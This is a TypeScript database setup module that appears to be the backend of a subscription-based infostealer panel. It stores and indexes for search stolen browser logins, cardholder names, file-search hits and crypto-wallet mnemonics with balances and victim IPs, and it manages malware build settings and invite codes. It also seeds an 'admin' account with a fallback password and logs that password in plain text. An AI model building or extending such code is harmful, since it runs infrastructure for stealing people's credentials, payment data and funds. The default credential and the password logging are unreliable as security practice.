import { drizzle } from 'drizzle-orm/postgres-js';
import { eq, sql } from 'drizzle-orm';
import postgres from 'postgres';
import { config } from 'dotenv';
import { migrate } from 'drizzle-orm/postgres-js/migrator';
import { Logger } from '../utils/logger';
import * as schema from './schema';
import path from 'path';

config();

if (!process.env.DATABASE_URL) {
  Logger.error('❌ DATABASE_URL environment variable is required');
  Logger.error(
    'Please create a .env file with DATABASE_URL=postgresql://username:password@localhost:5432/database_name',
  );
  throw new Error('DATABASE_URL environment variable is required');
}

// Create the connection
const connectionString = process.env.DATABASE_URL;
const client = postgres(connectionString, { max: 10 });
export const db = drizzle(client, { schema });
export { client };
Logger.info('Database connection established');

// Check if database schema is properly set up
export async function checkDatabaseSchema(): Promise<boolean> {
  try {
    // Try to query the users table to see if it exists with the expected schema
    await db
      .select({ count: sql<number>`count(*)` })
      .from(schema.users)
      .limit(1);

    return true;
  } catch (error) {
    return false;
  }
}

// Run database migrations (legacy method - prefer db:push for development)
export async function runMigrations(): Promise<void> {
  try {
    Logger.info('🔄 Running database migrations...');
    const migrationsPath = path.join(__dirname, 'migrations');
    await migrate(db, { migrationsFolder: migrationsPath });
    Logger.info('✅ Database migrations completed successfully');
    Logger.info('Database migrations completed successfully');
  } catch (error) {
    Logger.error('❌ Failed to run migrations');
    Logger.error('Error:', { error: error instanceof Error ? error.message : String(error) });
    Logger.error('');
    Logger.error('💡 Alternative: Try running "npm run db:push" instead.');
    Logger.error('This will synchronize your schema directly without using migration files.');
    Logger.error('Migration failed:', error as Record<string, unknown>);
    throw error;
  }
}

/**
 * Database health check and search functionality setup
 * Returns health status for production monitoring
 */
async function ensureSearchFunctionality(): Promise<{ healthy: boolean; details: any }> {
  const healthReport = {
    searchColumns: 0,
    searchIndexes: 0,
    totalTables: 5,
    errors: [] as string[],
  };

  try {
    const tables = [
      'browser_submissions',
      'filesearch_submissions',
      'wallet_submissions',
      'users',
      'invites',
    ];

    for (const table of tables) {
      try {
        // Check if search_vector column exists
        const columnCheck = await db.execute(sql`
          SELECT column_name
          FROM information_schema.columns
          WHERE table_name = ${table} AND column_name = 'search_vector'
        `);

        if (columnCheck.length === 0) {
          await db.execute(sql.raw(`ALTER TABLE ${table} ADD COLUMN search_vector tsvector;`));
          healthReport.searchColumns++;
        } else {
          healthReport.searchColumns++;
        }

        // Check if GIN index exists
        const indexName = `${table}_search_idx`;
        const indexCheck = await db.execute(sql`
          SELECT indexname
          FROM pg_indexes
          WHERE tablename = ${table} AND indexname = ${indexName}
        `);

        if (indexCheck.length === 0) {
          await db.execute(
            sql.raw(`CREATE INDEX ${indexName} ON ${table} USING GIN (search_vector);`),
          );
          healthReport.searchIndexes++;
        } else {
          healthReport.searchIndexes++;
        }
      } catch (error: any) {
        if (!error.message.includes('already exists')) {
          healthReport.errors.push(`${table}: ${error.message}`);
        }
      }
    }

    // Populate search vectors for existing data (silent operation)
    await db.execute(sql`
      UPDATE browser_submissions SET search_vector = to_tsvector('english',
        COALESCE(browser, '') || ' ' ||
        COALESCE(type, '') || ' ' ||
        COALESCE(desktop_name, '') || ' ' ||
        COALESCE(ip_address, '') || ' ' ||
        COALESCE(data->>'url', '') || ' ' ||
        COALESCE(data->>'title', '') || ' ' ||
        COALESCE(data->>'name', '') || ' ' ||
        COALESCE(data->>'username', '') || ' ' ||
        COALESCE(data->>'host', '') || ' ' ||
        COALESCE(data->>'domain', '') || ' ' ||
        COALESCE(data->>'name_on_card', '') || ' ' ||
        COALESCE(data->>'cardholder', '')
      )
      WHERE search_vector IS NULL
    `);

    await db.execute(sql`
      UPDATE filesearch_submissions SET search_vector = to_tsvector('english',
        COALESCE(line, '') || ' ' ||
        COALESCE(pattern, '') || ' ' ||
        COALESCE(ip_address, '') || ' ' ||
        COALESCE(data::text, '')
      )
      WHERE search_vector IS NULL
    `);

    await db.execute(sql`
      UPDATE wallet_submissions SET search_vector = to_tsvector('english',
        COALESCE(wallet, '') || ' ' ||
        COALESCE(mnemonic, '') || ' ' ||
        COALESCE(balance_usd::text, '') || ' ' ||
        COALESCE(ip_address, '')
      )
      WHERE search_vector IS NULL
    `);

    await db.execute(sql`
      UPDATE users SET search_vector = to_tsvector('english',
        COALESCE(username, '') || ' ' ||
        COALESCE(access_key, '') || ' ' ||
        COALESCE(ip_address, '')
      )
      WHERE search_vector IS NULL
    `);

    await db.execute(sql`
      UPDATE invites SET search_vector = to_tsvector('english',
        COALESCE(code, '') || ' ' ||
        COALESCE(subscription_type, '') || ' ' ||
        COALESCE(subscription_days::text, '')
      )
      WHERE search_vector IS NULL
    `);

    const healthy =
      healthReport.errors.length === 0 &&
      healthReport.searchColumns === healthReport.totalTables &&
      healthReport.searchIndexes === healthReport.totalTables;

    return { healthy, details: healthReport };
  } catch (error: any) {
    healthReport.errors.push(`Search setup failed: ${error.message}`);
    return { healthy: false, details: healthReport };
  }
}

/**
 * Comprehensive database health check and initialization
 * Returns detailed health report for production monitoring
 */
export async function initializeDatabase(): Promise<{ healthy: boolean; report: any }> {
  const healthReport = {
    connection: false,
    schema: false,
    adminUser: false,
    configurations: false,
    searchFunctionality: false,
    errors: [] as string[],
    warnings: [] as string[],
  };

  try {
    // Test database connection
    healthReport.connection = true;

    // Check schema health
    const schemaReady = await checkDatabaseSchema();
    if (!schemaReady) {
      try {
        const { spawn } = require('child_process');
        const drizzleProcess = spawn('npx', ['drizzle-kit', 'push:pg'], {
          stdio: 'pipe',
          shell: true,
          env: { ...process.env, NODE_ENV: 'development' },
        });

        await new Promise<void>((resolve, reject) => {
          drizzleProcess.on('close', (code: number | null) => {
            if (code === 0) {
              resolve();
            } else {
              reject(new Error(`Schema sync failed with code ${code}`));
            }
          });
        });

        const schemaReadyAfterSync = await checkDatabaseSchema();
        if (!schemaReadyAfterSync) {
          throw new Error('Database schema synchronization failed');
        }
        healthReport.schema = true;
      } catch (error) {
        healthReport.errors.push(
          `Schema sync failed: ${error instanceof Error ? error.message : String(error)}`,
        );
        throw error;
      }
    } else {
      healthReport.schema = true;
    }

    // Check admin user health
    const adminUsers = await db.select().from(schema.users).where(eq(schema.users.isAdmin, true));
    if (adminUsers.length === 0) {
      const bcrypt = require('bcryptjs');
      const crypto = require('crypto');
      const adminPassword = process.env.ADMIN_PASSWORD || 'admin';
      const hashedPassword = bcrypt.hashSync(adminPassword, 10);
      const accessKey = crypto.randomBytes(8).toString('hex').toUpperCase();

      await db.insert(schema.users).values({
        username: 'admin',
        passwordHash: hashedPassword,
        accessKey: accessKey,
        isAdmin: true,
      });

      Logger.warn('DEFAULT ADMIN USER CREATED', {
        username: 'admin',
        password: adminPassword,
        accessKey: accessKey,
      });
    }
    healthReport.adminUser = true;

    // Check configuration health
    const existingConfig = await db
      .select()
      .from(schema.builderConfig)
      .where(eq(schema.builderConfig.id, 1));
    if (existingConfig.length === 0) {
      await db.insert(schema.builderConfig).values({
        id: 1,
        buildsEnabled: true,
        buildCooldownSeconds: 120,
      });
    }

    const existingRuntime = await db
      .select()
      .from(schema.telegramResetRuntime)
      .where(eq(schema.telegramResetRuntime.id, 1));
    if (existingRuntime.length === 0) {
      await db.insert(schema.telegramResetRuntime).values({
        id: 1,
        shouldRun: false,
      });
    }
    healthReport.configurations = true;

    // Check search functionality health
    const searchHealth = await ensureSearchFunctionality();
    healthReport.searchFunctionality = searchHealth.healthy;
    if (!searchHealth.healthy) {
      healthReport.errors.push(...searchHealth.details.errors);
    }

    const healthy =
      healthReport.errors.length === 0 &&
      healthReport.connection &&
      healthReport.schema &&
      healthReport.adminUser &&
      healthReport.configurations &&
      healthReport.searchFunctionality;

    // Log health status
    if (healthy) {
      Logger.info('Database is healthy', {
        connection: 'OK',
        schema: 'OK',
        adminUser: 'OK',
        configurations: 'OK',
        searchFunctionality: 'OK',
      });
    } else {
      Logger.warn('Database health issues detected', healthReport);
    }

    return { healthy, report: healthReport };
  } catch (error) {
    Logger.error('❌ Database initialization failed', {
      error: error instanceof Error ? error.message : String(error),
      stack: error instanceof Error ? error.stack : undefined,
    });

    Logger.error('❌ Database initialization failed');
    Logger.error('Error:', { error: error instanceof Error ? error.message : String(error) });

    // Provide helpful error messages based on the type of error
    if (error instanceof Error) {
      if (error.message.includes('connection')) {
        Logger.error('💡 Check your DATABASE_URL in .env file');
      } else if (error.message.includes('permission')) {
        Logger.error('💡 Check database user permissions');
      } else if (error.message.includes('schema')) {
        Logger.error('💡 Try running: npm run db:push');
      }
    }

    throw error;
  }
}
